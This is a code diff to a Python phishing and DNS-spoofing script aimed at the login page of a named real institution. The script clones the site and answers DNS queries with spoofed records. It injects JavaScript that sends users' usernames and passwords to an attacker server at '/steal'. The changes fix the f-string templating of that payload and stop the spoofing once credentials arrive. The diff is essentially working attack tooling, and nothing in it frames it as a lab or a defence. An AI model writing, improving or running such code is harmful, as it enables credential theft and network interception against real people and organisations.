@@ -13,6 +13,9 @@ target_domain = "fs.singaporetech.edu.sg"
 cloned_site_dir = "cloned_site"
 attacker_server_port = 8080
 
+# Global variable to stop DNS spoofing
+stop_sniffing = False
+
 # Function to clone the website
 def clone_website(url, save_dir):
     if not os.path.exists(save_dir):
@@ -68,9 +71,13 @@ def dns_spoof(pkt):
             send(spoofed_pkt, verbose=0)
             print(f"Sent spoofed DNS response to {pkt[IP].src}")
 
+def stop_filter(pkt):
+    return stop_sniffing
+
 # Define the attacker's server to capture credentials
 class StealCredentialsHandler(BaseHTTPRequestHandler):
     def do_POST(self):
+        global stop_sniffing
         content_length = int(self.headers['Content-Length'])
         post_data = self.rfile.read(content_length)
         parsed_data = parse_qs(post_data.decode('utf-8'))
@@ -85,6 +92,10 @@ class StealCredentialsHandler(BaseHTTPRequestHandler):
         self.send_header('Content-type', 'text/html')
         self.end_headers()
         self.wfile.write(b"Credentials stolen successfully")
+
+        # Stop DNS spoofing
+        stop_sniffing = True
+        print("Credentials obtained. Stopping DNS spoofing...")
 
 # Start the attacker's server
 def start_attacker_server():
@@ -103,10 +114,10 @@ with open(index_path, 'r', encoding='utf-8') as file:
 
 html_content = html_content.replace(
     '<form method="post" id="loginForm" autocomplete="off" novalidate="novalidate" action="http://fs.singaporetech.edu.sg">',
-    '<form method="post" id="loginForm" autocomplete="off" novalidate="novalidate" onsubmit="return sendCredentials();" action="http://fs.singaporetech.edu.sg">'
+    f'<form method="post" id="loginForm" autocomplete="off" novalidate="novalidate" onsubmit="return sendCredentials();" action="http://{attacker_ip}:{attacker_server_port}/steal">'
 ).replace(
     '<script type="text/javascript">',
-    '<script type="text/javascript">\nfunction sendCredentials() {\n    var userName = document.getElementById(\'userNameInput\').value;\n    var password = document.getElementById(\'passwordInput\').value;\n\n    var xhr = new XMLHttpRequest();\n    xhr.open("POST", "http://{attacker_ip}:{attacker_server_port}/steal", true);\n    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");\n    xhr.send("username=" + encodeURIComponent(userName) + "&password=" + encodeURIComponent(password));\n\n    window.location.href = "https://xsite.singaporetech.edu.sg";\n    return false;\n}\n'
+    f'<script type="text/javascript">\nfunction sendCredentials() {{\n    var userName = document.getElementById(\'userNameInput\').value;\n    var password = document.getElementById(\'passwordInput\').value;\n\n    var xhr = new XMLHttpRequest();\n    xhr.open("POST", "http://{attacker_ip}:{attacker_server_port}/steal", true);\n    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");\n    xhr.send("username=" + encodeURIComponent(userName) + "&password=" + encodeURIComponent(password));\n\n    window.location.href = "https://xsite.singaporetech.edu.sg";\n    return false;\n}}\n'
 )
 
 with open(index_path, 'w', encoding='utf-8') as file:
@@ -122,4 +133,4 @@ attacker_server_thread.start()
 
 # Start DNS spoofing
 print("Starting DNS spoofing...")
-sniff(filter="udp port 53", prn=dns_spoof)
+sniff(filter="udp port 53", prn=dns_spoof, stop_filter=stop_filter)
